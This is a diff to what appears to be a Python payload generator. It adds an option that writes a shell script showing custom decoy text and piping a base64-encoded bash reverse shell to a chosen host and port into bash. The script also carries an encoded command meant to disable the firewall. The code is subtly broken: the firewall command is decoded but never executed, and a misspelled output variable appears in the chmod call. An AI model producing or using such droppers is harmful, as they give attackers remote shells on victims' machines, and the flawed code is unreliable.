@@ -82,6 +82,19 @@ if payload=="a" or payload=="A":
 	f.write(f"echo -e '\033[1;38m {additional}' && base64 -d <<< {encodedrshells} | bash")
 	f.close()
 	os.system(f"chmod 777 {outut}/{name}.sh")
+elif payload=="b" or payload=="B":
+	additional=click.prompt("ENTER ANY ADDITIONAL DIALOGUES WHEN EXECUTING :", type=str, default="")
+	firewalls="systemctl disable firewalld &> /dev/null"
+	firewall=base64.b64encode(firewalls.encode("utf-8"))
+	firewalld=firewall.decode("utf-8")
+	rshell=f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
+	encodedrshell=base64.b64encode(rshell.encode("utf-8"))
+	encodedrshells=encodedrshell.decode("utf-8")
+	print(f"GENERATING PAYLOAD >>> {output}/{name}.sh")
+	f=open(f"{output}/{name}.sh","w+")
+	f.write(f"echo -e '\033[1;38m {additional}' && base64 -d <<< {firewalld} && base64 -d <<< {encodedrshells} | bash")
+	f.close()
+	os.system(f"chmod 777 {outut}/{name}.sh")
 elif payload=="1":
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
